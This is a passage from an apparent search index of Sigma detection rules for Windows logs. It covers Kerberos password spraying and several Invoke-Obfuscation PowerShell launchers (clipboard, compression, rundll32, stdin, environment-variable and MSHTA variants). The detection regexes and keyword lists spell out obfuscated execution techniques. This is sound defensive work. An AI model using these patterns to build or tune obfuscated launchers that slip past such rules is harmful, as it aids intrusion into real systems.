logins with multiple invalid domain accounts from a single source system using the Kerberos protocol. status: experimental author: Mauricio Velazco, frack113 date: 2021/06/01 modified: 2021/07/06 references: - https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection: EventID: 4768 Status: \u0026#39;0x6\u0026#39; filter_computer: TargetUserName|endswith: \u0026#39;$\u0026#39; timeframe: 24h condition: - selection and not filter_computer | count(TargetUserName) by IpAddress \u0026gt; 10 falsepositives: - Vulnerability scanners - Misconfigured systems - Remote administration tools - VPN terminators - Multiuser systems like Citrix server farms level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logons_single_source_kerberos3.yml/","tags":["attack.t1110.003","attack.initial_access","attack.privilege_escalation"],"title":"Invalid Users Failing To Authenticate From Source Using Kerberos"},{"categories":null,"contents":"Detects Obfuscated use of Clip.exe to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation CLIP+ Launcher id: f7385ee2-0e0c-11eb-adc1-0242ac120002 description: Detects Obfuscated use of Clip.exe to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/13 modified: 2022/02/03 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 26) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|contains|all: - \u0026#39;cmd\u0026#39; - \u0026#39;clip\u0026#39; - \u0026#39;clipboard]::\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_clip_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation CLIP+ Launcher"},{"categories":null,"contents":"Detects Obfuscated use of Clip.exe to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation CLIP+ Launcher id: 73e67340-0d25-11eb-adc1-0242ac120002 description: Detects Obfuscated use of Clip.exe to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/13 modified: 2021/10/16 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 26) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: \u0026#39;.*cmd.{0,5}(?:\\/c|\\/r).+clip(?:\\.exe)?.{0,4}\u0026amp;\u0026amp;.+clipboard]::\\(\\s\\\\\\\u0026#34;\\{\\d\\}.+\\-f.+\\\u0026#34;\u0026#39; condition: selection_4104 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_clip.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation CLIP+ Launcher"},{"categories":null,"contents":"Detects Obfuscated use of Clip.exe to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation CLIP+ Launcher id: b222df08-0e07-11eb-adc1-0242ac120002 status: test description: Detects Obfuscated use of Clip.exe to execute PowerShell author: Jonathan Cheong, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 26) date: 2020/10/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: \u0026#39;.*cmd.{0,5}(?:\\/c|\\/r).+clip(?:\\.exe)?.{0,4}\u0026amp;\u0026amp;.+clipboard]::\\(\\s\\\\\\\u0026#34;\\{\\d\\}.+\\-f.+\\\u0026#34;\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_clip.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation CLIP+ Launcher"},{"categories":null,"contents":"Detects Obfuscated Powershell via COMPRESS OBFUSCATION\nKnown false-positives unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation COMPRESS OBFUSCATION id: 175997c5-803c-4b08-8bb0-70b099f47595 description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/06 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 19) falsepositives: - unknown level: medium logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|contains|all: - \u0026#39;new-object\u0026#39; - \u0026#39;text.encoding]::ascii\u0026#39; - \u0026#39;readtoend\u0026#39; ImagePath|contains: - \u0026#39;:system.io.compression.deflatestream\u0026#39; - \u0026#39;system.io.streamreader\u0026#39; condition: selection tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_via_compress_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation COMPRESS OBFUSCATION"},{"categories":null,"contents":"Detects Obfuscated Powershell via COMPRESS OBFUSCATION\nKnown false-positives unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation COMPRESS OBFUSCATION id: 20e5497e-331c-4cd5-8d36-935f6e2a9a07 description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/08 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 19) logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - \u0026#39;new-object\u0026#39; - \u0026#39;text.encoding]::ascii\u0026#39; ScriptBlockText|contains: - \u0026#39;system.io.compression.deflatestream\u0026#39; - \u0026#39;system.io.streamreader\u0026#39; ScriptBlockText|endswith: \u0026#39;readtoend\u0026#39; condition: selection_4104 falsepositives: - unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_compress.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation COMPRESS OBFUSCATION"},{"categories":null,"contents":"Detects Obfuscated Powershell via COMPRESS OBFUSCATION\nKnown false-positives unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation COMPRESS OBFUSCATION id: 7eedcc9d-9fdb-4d94-9c54-474e8affc0c7 status: test description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION author: Timur Zinniatullin, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 19) date: 2020/10/18 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;new-object\u0026#39; - \u0026#39;text.encoding]::ascii\u0026#39; CommandLine|contains: - \u0026#39;system.io.compression.deflatestream\u0026#39; - \u0026#39;system.io.streamreader\u0026#39; CommandLine|endswith: \u0026#39;readtoend\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_compress.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation COMPRESS OBFUSCATION"},{"categories":null,"contents":"Detects Obfuscated Powershell via RUNDLL LAUNCHER\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation RUNDLL LAUNCHER id: 11b52f18-aaec-4d60-9143-5dd8cc4706b9 description: Detects Obfuscated Powershell via RUNDLL LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/07 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 23) logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|contains|all: - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;shell32.dll\u0026#39; - \u0026#39;shellexec_rundll\u0026#39; - \u0026#39;powershell\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_via_rundll_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation RUNDLL LAUNCHER"},{"categories":null,"contents":"Detects Obfuscated Powershell via RUNDLL LAUNCHER\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation RUNDLL LAUNCHER id: e6cb92b4-b470-4eb8-8a9d-d63e8583aae0 description: Detects Obfuscated Powershell via RUNDLL LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/08 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 23) logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;shell32.dll\u0026#39; - \u0026#39;shellexec_rundll\u0026#39; - \u0026#39;powershell\u0026#39; condition: selection_4104 falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_rundll.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation RUNDLL LAUNCHER"},{"categories":null,"contents":"Detects Obfuscated Powershell via RUNDLL LAUNCHER\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation RUNDLL LAUNCHER id: 056a7ee1-4853-4e67-86a0-3fd9ceed7555 status: test description: Detects Obfuscated Powershell via RUNDLL LAUNCHER author: Timur Zinniatullin, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 23) date: 2020/10/18 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;shell32.dll\u0026#39; - \u0026#39;shellexec_rundll\u0026#39; - \u0026#39;powershell\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_rundll.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation RUNDLL LAUNCHER"},{"categories":null,"contents":"Detects Obfuscated use of stdin to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation STDIN+ Launcher id: 72862bf2-0eb1-11eb-adc1-0242ac120002 description: Detects Obfuscated use of stdin to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/11/30 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 25) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|re: \u0026#39;.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\u0026#34;\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_stdin_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation STDIN+ Launcher"},{"categories":null,"contents":"Detects Obfuscated use of stdin to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation STDIN+ Launcher id: 779c8c12-0eb1-11eb-adc1-0242ac120002 description: Detects Obfuscated use of stdin to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/10/16 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 25) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: \u0026#39;.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\u0026#34;\u0026#39; condition: selection_4104 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_stdin.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation STDIN+ Launcher"},{"categories":null,"contents":"Detects Obfuscated use of stdin to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation STDIN+ Launcher id: 6c96fc76-0eb1-11eb-adc1-0242ac120002 status: test description: Detects Obfuscated use of stdin to execute PowerShell author: Jonathan Cheong, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 25) date: 2020/10/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: \u0026#39;.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\u0026#34;\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_stdin.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation STDIN+ Launcher"},{"categories":null,"contents":"Detects Obfuscated use of Environment Variables to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation VAR+ Launcher id: 8ca7004b-e620-4ecb-870e-86129b5b8e75 description: Detects Obfuscated use of Environment Variables to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/11/30 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 24) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|re: \u0026#39;.*cmd.{0,5}(?:\\/c|\\/r)(?:\\s|)\\\u0026#34;set\\s[a-zA-Z]{3,6}.*(?:\\{\\d\\}){1,}\\\\\\\u0026#34;\\s+?\\-f(?:.*\\)){1,}.*\\\u0026#34;\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_var_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation VAR+ Launcher"},{"categories":null,"contents":"Detects Obfuscated use of Environment Variables to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation VAR+ Launcher id: 0adfbc14-0ed1-11eb-adc1-0242ac120002 description: Detects Obfuscated use of Environment Variables to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/10/16 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 24) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: \u0026#39;.*cmd.{0,5}(?:\\/c|\\/r)(?:\\s|)\\\u0026#34;set\\s[a-zA-Z]{3,6}.*(?:\\{\\d\\}){1,}\\\\\\\u0026#34;\\s+?\\-f(?:.*\\)){1,}.*\\\u0026#34;\u0026#39; condition: selection_4104 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_var.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation VAR+ Launcher"},{"categories":null,"contents":"Detects Obfuscated use of Environment Variables to execute PowerShell\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation VAR+ Launcher id: 27aec9c9-dbb0-4939-8422-1742242471d0 status: test description: Detects Obfuscated use of Environment Variables to execute PowerShell author: Jonathan Cheong, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task 24) date: 2020/10/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: \u0026#39;.*cmd.{0,5}(?:\\/c|\\/r)(?:\\s|)\\\u0026#34;set\\s[a-zA-Z]{3,6}.*(?:\\{\\d\\}){1,}\\\\\\\u0026#34;\\s+?\\-f(?:.*\\)){1,}.*\\\u0026#34;\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_var.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation VAR+ Launcher"},{"categories":null,"contents":"Detects Obfuscated Powershell via VAR++ LAUNCHER\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION id: 14bcba49-a428-42d9-b943-e2ce0f0f7ae6 description: Detects Obfuscated Powershell via VAR++ LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/13 modified: 2021/11/30 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task27) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|re: \u0026#39;(?i).*\u0026amp;\u0026amp;set.*(\\{\\d\\}){2,}\\\\\\\u0026#34;\\s+?\\-f.*\u0026amp;\u0026amp;.*cmd.*\\/c\u0026#39; # FPs with |\\/r condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_via_var_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION"},{"categories":null,"contents":"Detects Obfuscated Powershell via VAR++ LAUNCHER\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION id: e54f5149-6ba3-49cf-b153-070d24679126 description: Detects Obfuscated Powershell via VAR++ LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/13 modified: 2021/10/16 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task27) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: \u0026#39;(?i).*\u0026amp;\u0026amp;set.*(\\{\\d\\}){2,}\\\\\\\u0026#34;\\s+?\\-f.*\u0026amp;\u0026amp;.*cmd.*\\/c\u0026#39; # FPs with |\\/r condition: selection_4104 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_var.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION"},{"categories":null,"contents":"Detects Obfuscated Powershell via VAR++ LAUNCHER\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION id: e9f55347-2928-4c06-88e5-1a7f8169942e status: test description: Detects Obfuscated Powershell via VAR++ LAUNCHER author: Timur Zinniatullin, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task27) date: 2020/10/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: \u0026#39;(?i).*\u0026amp;\u0026amp;set.*(\\{\\d\\}){2,}\\\\\\\u0026#34;\\s+?\\-f.*\u0026amp;\u0026amp;.*cmd.*\\/c\u0026#39; # FPs with |\\/r condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_var.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION"},{"categories":null,"contents":"Detects Obfuscated Powershell via Stdin in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Stdin id: 487c7524-f892-4054-b263-8a0ace63fc25 description: Detects Obfuscated Powershell via Stdin in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/12 modified: 2021/11/30 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task28) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|re: \u0026#39;(?i).*(set).*\u0026amp;\u0026amp;\\s?set.*(environment|invoke|\\${?input).*\u0026amp;\u0026amp;.*\u0026#34;\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_via_stdin_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Stdin"},{"categories":null,"contents":"Detects Obfuscated Powershell via Stdin in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Stdin id: 86b896ba-ffa1-4fea-83e3-ee28a4c915c7 description: Detects Obfuscated Powershell via Stdin in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/12 modified: 2021/10/16 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task28) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: \u0026#39;(?i).*(set).*\u0026amp;\u0026amp;\\s?set.*(environment|invoke|\\${?input).*\u0026amp;\u0026amp;.*\u0026#34;\u0026#39; condition: selection_4104 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_stdin.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Stdin"},{"categories":null,"contents":"Detects Obfuscated Powershell via Stdin in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Stdin id: 9c14c9fa-1a63-4a64-8e57-d19280559490 status: test description: Detects Obfuscated Powershell via Stdin in Scripts author: Nikita Nazarov, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task28) date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: \u0026#39;(?i).*(set).*\u0026amp;\u0026amp;\\s?set.*(environment|invoke|\\${?input).*\u0026amp;\u0026amp;.*\u0026#34;\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_stdin.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Stdin"},{"categories":null,"contents":"Detects Obfuscated Powershell via use Clip.exe in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use Clip id: 63e3365d-4824-42d8-8b82-e56810fefa0c description: Detects Obfuscated Powershell via use Clip.exe in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2021/11/30 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task29) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|re: \u0026#39;(?i).*?echo.*clip.*\u0026amp;\u0026amp;.*(Clipboard|i`?n`?v`?o`?k`?e`?).*\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_via_use_clip_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use Clip"},{"categories":null,"contents":"Detects Obfuscated Powershell via use Clip.exe in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use Clip id: db92dd33-a3ad-49cf-8c2c-608c3e30ace0 description: Detects Obfuscated Powershell via use Clip.exe in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2021/10/16 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task29) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: \u0026#39;(?i).*?echo.*clip.*\u0026amp;\u0026amp;.*(Clipboard|i`?n`?v`?o`?k`?e`?).*\u0026#39; condition: selection_4104 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_clip.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use Clip"},{"categories":null,"contents":"Detects Obfuscated Powershell via use Clip.exe in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use Clip id: e1561947-b4e3-4a74-9bdd-83baed21bdb5 status: test description: Detects Obfuscated Powershell via use Clip.exe in Scripts author: Nikita Nazarov, oscd.community references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task29) date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: \u0026#39;(?i).*?echo.*clip.*\u0026amp;\u0026amp;.*(Clipboard|i`?n`?v`?o`?k`?e`?).*\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_use_clip.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use Clip"},{"categories":null,"contents":"Detects Obfuscated Powershell via use MSHTA in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use MSHTA id: 7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4 description: Detects Obfuscated Powershell via use MSHTA in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2022/03/06 references: - https://github.com/Neo23x0/sigma/issues/1009 #(Task31) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|contains|all: - \u0026#39;set\u0026#39; - \u0026#39;\u0026amp;\u0026amp;\u0026#39; - \u0026#39;mshta\u0026#39; - \u0026#39;vbscript:createobject\u0026#39; - \u0026#39;.run\u0026#39; - \u0026#39;(window.close)\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_invoke_obfuscation_via_use_mshta_services.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Invoke-Obfuscation Via Use MSHTA"},{"categories":null,"contents":"Detects Obfuscated Powershell via use MSHTA in Scripts\nKnown false-positives Unknown References https://github.com/Neo23x0/sigma/issues/1009 Raw rule (edit) title: Invoke-Obfuscation Via Use MSHTA id: e55a5195-4724-480e-a77e-3ebe64bd3759 description: Detects Obfuscated Powershell via use MSHTA in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/08 